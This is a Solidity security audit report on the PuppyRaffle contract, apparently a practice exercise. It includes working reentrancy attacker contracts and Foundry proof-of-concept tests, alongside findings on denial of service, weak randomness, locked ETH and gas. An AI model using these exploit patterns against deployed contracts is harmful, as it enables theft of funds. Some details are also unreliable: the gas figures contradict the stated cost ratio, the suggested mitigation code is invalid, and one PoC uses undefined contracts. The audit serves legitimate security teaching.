### [H-1] Reentrancy Attack in `PuppyRaffle::refund` allows entrants to drain contract balance


**Description:** The `PuppyRaffle::refund` does not follow CEI (Check Effects and Intreaction)
and thus is a vulnerable function causing a reentrancy attack

In `PuppyRaffle::refund` at first we make an external call to `msg.sender`and only after
that we are updating the `players` array

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
@>        payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);  
        emit RaffleRefunded(playerAddress);
    }


```

**Impact:** The malicious user can call the refund using an external contract by using the `fallback`
or `receive` function to drain all the money from the contract. 

**Proof of Concept:**

Here is the Proof of Code 
```javascript
// Attacker contract

contract Attacker {
    PuppyRaffle raffle;

    constructor(address _raffleAddress) {
        raffle = PuppyRaffle(_raffleAddress);
    }

    function attack() external payable {
        // Ensure the contract has enough balance to trigger multiple refunds
        require(address(this).balance >= raffle.entranceFee(), "Insufficient balance");
        // Trigger multiple refunds in a loop
        for (uint i = 0; i < 10; i++) {
            raffle.refund(0); // Assuming attacker's address is at index 0
        }
    }
}


```

**Recommended Mitigation:** To mitigate this vulnerability, follow the CEI pattern by updating state variables before making external calls. In this case, move the update of the players array before the external call to msg.sender. 

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");       
-       payable(msg.sender).sendValue(entranceFee);
+        players[playerIndex] = address(0);
-        players[playerIndex] = address(0);  
+        payable(msg.sender).sendValue(entranceFee);
        emit RaffleRefunded(playerAddress);
    }

```


### [M-1] Looping through the players array checking duplicates `PuppyRaffle::enterRaffle` 
### causes denial of services attack leading to more gas for future entrant



**Description:** The `PuppyRaffle::enterRaffle` loops through the array of players to check for duplicates
Howerver the longer the array length would be the more checks it will require. It will make an Ambiguity
By the players who enters first have to pay less gas fees than the players who enter later.

```javascript
    // @ Dos attack detected 
    for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
    }
```



**Impact:** The gas cost for raffle entrants will greatly increase.
As more players enter the raffle. Discouraging the future players to enter 
the raffle

And also a attacker can fill the entire array of `entrants` with malicious
account such that no other players will enter which makes him always win

**Proof of Concept:**
If we have two set of hundred players entering the raffle It will cost gas as
1st 100 players ~ 6252048 gas
2nd 100 players ~ 6252048 gas

Which is 3x time more expensive for second 100 players

<details>
<summary>
PoC
</summary>

Paste the following test into `PuppyRaffle::PuppyRaffleTest.t.sol`
``` javascript

     function testCanOccurDos () public  {

        vm.txGasPrice(1);
        uint256 playersNum = 100;
        address [] memory players = new address [](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value:entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsed = (gasStart - gasEnd)*tx.gasprice;

        console.log ("Gas cost of first 100 players" , gasUsed);


        // Now for Second one 100 players

        address [] memory playersTwo = new address [](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }
        uint256 gasStarttwo = gasleft();
        puppyRaffle.enterRaffle{value:entranceFee * playersTwo.length}(playersTwo);
        uint256 gasEndtwo = gasleft();

        uint256 gasUsed2 = (gasStarttwo - gasEndtwo)*tx.gasprice;

        console.log ("Gas cost of second 100 players" , gasUsed2);

        address [] memory playersThree = new address [](playersNum);
        for (uint256 i = 0; i < playersThree.length; i++) {
            playersThree[i] = address(i + 1000);
        }
        uint256 gasStartThree = gasleft();
        puppyRaffle.enterRaffle{value:entranceFee*playersThree.length}(playersThree);
        uint256 gasEndThree = gasleft();

        uint256 gasUsedThree = (gasStartThree - gasEndThree);

        console.log("Gas used dutring the third 100 persons is " , gasUsedThree);


        assert (gasUsed < gasUsed2);
        assert(gasUsed2 < gasUsedThree);

    }
```

I have also added some more functionality by testing another one set of 100 more players
It will gost 6x times of first 100 players

</details>



**Recommended Mitigation:** Some of recommendation are: 

  1. Consider allowing duplicates, Users can make a new wallet address
  anyways so checking duplicates doesn't really works here, So it will
  not prevent the entry of same person entering many time.

  2. Consider using mapping to check the duplicates. This will allow
  constant time lookup of whether a user has entered a raffle or not

  ``` javascript
   mapping (address => uint256) public immutable players1;
   uint256 public raffleId;

    for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
            players1[newPlayers[i]] = raffleId; 
    }

    for (uint256 i = 0; i < players.length; i++) {
        require (players1[msg.sender] != raffleId , "No Duplicate Player Allowed");
    }

  ```

  This are some of the changes you can consider to do in your code base 

### [M-2] Making call to external contract after changing the state causes Reentrancy Attack

**Description:** The `PuppyRaffle::refund` function is sending some eth to contract balance 
before even changing the state of the contract this type of coding pattern can cause a severe
attack popularly known as Reentrancy Attack.The attacker can call the `Attack::attack` function
to call the `PuppyRaffle::Address::sendValue` method in a loop to steal all the eth from the 
contract

**Impact:** All the eth that is deposited in a balance of contract get stole. An attacker by using 
`recieve` or `fallback` function can easily steal all the balance of contract and also
get his extra one eth back.The attacker will simply call the `Address::sendValue` function
in a loop using the recieve or fallback

**Proof of Concept:**

We have created a separate contract called `ReentrancyAttack` to test our `test__reentrancy` function
Here we are entering with 4 players with entrance fees. In the `ReentranctAttack::stealMoney` function
we are calling the external call to `PuppyRaffle::refund` function that loops the execution of refund function.The receive and fallback are calling the refund simulatenously until the balance of `PuppyRaffle` becomes 0 eth. 

Here is Proof of Code where we are checking after and before balance of attacker and contract

```javascript
    

    function test__reentrancy () public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttack attackContract = new ReentrancyAttack(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser,1 ether);

        uint256 startingAttackerBalance = address(attackContract).balance;
        uint256 startingRaffleBalance = address (puppyRaffle).balance;

        vm.prank(attackUser);
        attackContract.attack{value:entranceFee}();

        console.log("Starting contract balance" , startingRaffleBalance);
        console.log("Staring attacker balance" , startingAttackerBalance);

        console.log("Ending attacker balance" , address(attackContract).balance);
        console.log("Ending contract balance" , address(puppyRaffle).balance);

    }

    contract ReentrancyAttack {

    PuppyRaffle raffle;
    uint256 entranceFee;
    uint256  _playerIndex;

    constructor (PuppyRaffle _raffle) {
        raffle = _raffle;
        entranceFee = raffle.entranceFee();
    }

    function attack () public payable {
        address [] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value:entranceFee}(players);
        _playerIndex = raffle.getActivePlayerIndex(address(this));
        raffle.refund(_playerIndex);
    }

    function _stealMoney () public {
        if (address(raffle).balance >= entranceFee) {
            raffle.refund(_playerIndex);
        }
    }

    fallback () external payable {
        _stealMoney();
    }

    receive () external payable {
        _stealMoney();
    }
    
  }
```



**Recommended Mitigation:** This are some recommended Mitigations

1. You can use something know as CEI (Check Effect and Interaction)
pattern in the codebase

2. You can also use a mutex lock for this purpose

3. Or you can use a standard and professional tool of OpenZeppelin known as `ReentrancyGuard:nonReentrant`
This is a special kind of modifier of OpenZeppelin used to prevent reentrancy attack



### Weak PRNG Detected in Protocol. The random number generation is Weak

**Issue:**
The `PuppyRaffle::selectWinner` function within the protocol utilizes `block.timestamp` and `block.difficulty` to generate a random number. However, this approach is vulnerable to manipulation by miners, allowing attackers to potentially exploit the system and gain unfair advantages, such as winning raffles or obtaining rewards.

**Impact:**
The impact of weak random number generation in the protocol can be severe, potentially leading to financial losses and undermining trust in the system. Malicious actors could exploit this weakness to steal funds or resources allocated within the protocol.

**Proof of Concept:**
The provided Proof of Concept (PoC) demonstrates the vulnerability by comparing two random numbers generated consecutively. If they match, it indicates that the randomness is weak and predictable, thereby exposing the system to exploitation.

```javascript
 function test__randomnum () external {

        WeakRandomness rand = new WeakRandomness ();

        uint256 randNum = rand.getRandomNumber();

        assertEq(randNum , rand.getRandomNumber());
    }

contract WeakRandomness {
    /*
     * @notice A fair random number generator
     */
    function getRandomNumber() external view returns (uint256) {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(msg.sender,block.difficulty, block.timestamp)));
        return randomNumber;
    }
}

```

**Recommended Mitigation:**

1. **Use Secure Random Number Generation:**
   Replace the current method of random number generation with a more secure and robust approach. Utilize cryptographic functions or reputable external randomness oracles to ensure unpredictability and fairness.

2. **Avoid Block Timestamp and Difficulty:**
   Avoid using `block.timestamp` and `block.difficulty` as inputs for random number generation, as they can be manipulated by miners. Instead, consider alternative sources of randomness that are less susceptible to manipulation.

3. **Implement External Randomness Oracles:**
   Integrate external randomness oracles that provide verifiably random and unbiased outcomes. Oracles such as Chainlink VRF (Verifiable Random Function) can be used to securely generate random numbers on-chain.

4. **Use Multiple Sources of Entropy:**
   Combine multiple sources of entropy to enhance randomness. Incorporate various inputs such as user interactions, block hashes, and external data to increase the unpredictability of the generated numbers.

5. **Audit and Test Randomness Functions:**
   Regularly audit and test the randomness functions within the protocol to identify any weaknesses or vulnerabilities. Conduct thorough security assessments and code reviews to ensure the integrity and reliability of the random number generation process.

6. **Implement Proper Seed Management:**
   Manage seed values securely and avoid using predictable or easily guessable seeds. Employ techniques such as salted hashing or secret sharing to generate initial seeds for random number generation.

7. **Update PuppyRaffle::selectWinner Function:**
   Rewrite the `PuppyRaffle::selectWinner` function to incorporate the recommended mitigation measures and improve the randomness generation process. Ensure that the function follows best practices for secure random number generation.

By addressing the weaknesses in the current random number generation process and implementing the recommended mitigation strategies, the protocol can enhance its security posture and mitigate the risk of exploitation due to weak PRNG. Regular monitoring and updating of security measures are essential to maintain the integrity and trustworthiness of the protocol.


### [H-2] MisHandling of Eth Problem in `PuppyRaffle::withdraw` function 

**Description** There is this problem `PuppyRaffle::withdraw` the mishandling of Eth problem that leads to
permanent lock in the money of the users.The call to the function makes call to self destruct keyword.The keyword 
forcefully sends the Eth to the contract to break the equality of ` require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");`This will revert the transaction of withdraw.

**Impact** This will cause the impact that the the funds will never get withdrew from the contract. The funds get locked will cause a great headache for the user. The `PuppyRaffle::withdraw` function has a huge bug that can create a chaos in the protocol 

**Proof of Concept** 

<details>
<summary>Proof of Code (POC)</summary>

```javascript
    function test_mishandlingOfEthLocked() public {
        vm.prank(personA);
        vm.deal(personA , 1 ether);
        MishandlingOfEth mishandle = new MishandlingOfEth();
        mishandle.send{value: AMOUNT}();
        vm.prank(personB);
        vm.deal(personB , 1 ether);
        mishandle.send{value: AMOUNT}();
        vm.prank(personC);
        vm.deal(personC , 1 ether);
        mishandle.send{value: AMOUNT}();

        vm.prank(attackerEoA);
        vm.deal(attackerEoA , 1 ether);
        MishandlingOfEthAttacker attack = new MishandlingOfEthAttacker (mishandle);
        attack.attack();
         
        console.log("Balance of Contract", address(mishandle).balance);

        console.log("Balance of user A", address(personA).balance);
        console.log("Balance of user B", address(personB).balance);
        console.log("Balance of user C", address(personC).balance);
        console.log("Balance of Attacker" , address(attackerEoA).balance);

        vm.expectRevert();
        mishandlingOfEth.sendBack();
    }

```
Copy Paste this proof of code in your test file.
</details>

### Gas

### [G-1] Unchanged State variables should be declared as consatants or immutable

Reading from a storage is much more gas expensive than reading from a constant and immutable variable

Instances:
- `PuppyRaffle::raffleDuration` should be declared as immutable
- `PuppyRaffle::commonImageUri` should be declared as constant
- `PuppyRaffle::rareImageUri` should be declared as constant
- `PuppyRaffle::legendaryImageUri` should be declared as constant

### [G-2] Storage varaible in a loop should be cached 

Everytime you read `players.length` you can read from storage as reading from memory 
is more gas cosuming

```diff
+     uint256 playerLen = players.length;
-     for (uint256 i = 0; i < players.length - 1; i++) {
+     for (uint256 i = 0; i < playerLen - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < playerLen; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```

### [I-1]: Solidity pragma should be specific, not wide
Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of pragma solidity ^0.8.0;, use pragma solidity 0.8.0;

### [I-2]: Use of outdated version of solc is not recommended
Consider using a newer version of solc for the better secuirty purposes and for betterment of codebase
use `0.8.21` instead of `0.7.4`;

## [I-3]: Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 62](src/PuppyRaffle.sol#L62)

	```solidity
	    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
	```

- Found in src/PuppyRaffle.sol [Line: 165](src/PuppyRaffle.sol#L165)

	```solidity
	            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
	```

- Found in src/PuppyRaffle.sol [Line: 189](src/PuppyRaffle.sol#L189)

	```solidity
	    /// @notice only the owner of the contract can change the feeAddress
	```

